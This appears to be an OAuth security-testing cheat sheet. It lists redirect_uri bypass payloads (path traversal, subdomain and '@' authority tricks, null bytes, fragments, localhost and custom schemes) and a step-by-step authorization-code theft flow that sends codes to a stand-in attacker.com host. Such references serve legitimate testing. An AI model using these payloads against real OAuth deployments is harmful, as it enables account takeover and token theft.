<redirect_uri_attacks>
<open_redirect>
{% raw %}
# Test redirect_uri validation

# Path traversal
redirect_uri=https://app.com/callback/../attacker
redirect_uri=https://app.com/callback/..%2fattacker

# Subdomain bypass
redirect_uri=https://evil.app.com/callback
redirect_uri=https://app.com.evil.com/callback

# Authority confusion
redirect_uri=https://app.com@evil.com/callback
redirect_uri=https://evil.com%23@app.com/callback
redirect_uri=https://app.com%00.evil.com/callback

# Fragment bypass
redirect_uri=https://app.com/callback#.evil.com

# Protocol downgrade
redirect_uri=http://app.com/callback

# Localhost variations
redirect_uri=http://localhost:8080/callback
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# Custom scheme (mobile apps)
redirect_uri=myapp://callback
redirect_uri=com.evil.app://callback
{% endraw %}
</open_redirect>

<token_theft>
{% raw %}
# If redirect_uri validation is weak:

# 1. Attacker sends victim to authorization URL with malicious redirect_uri
GET /authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https://attacker.com/steal
  &scope=openid profile email
  &state=random

# 2. User authenticates (if not already)

# 3. Authorization code sent to attacker
GET /steal?code=AUTHORIZATION_CODE&state=random

# 4. Attacker exchanges code for tokens
POST /token
  grant_type=authorization_code
  &code=AUTHORIZATION_CODE
  &redirect_uri=https://attacker.com/steal
  &client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET
{% endraw %}
</token_theft>
</redirect_uri_attacks>

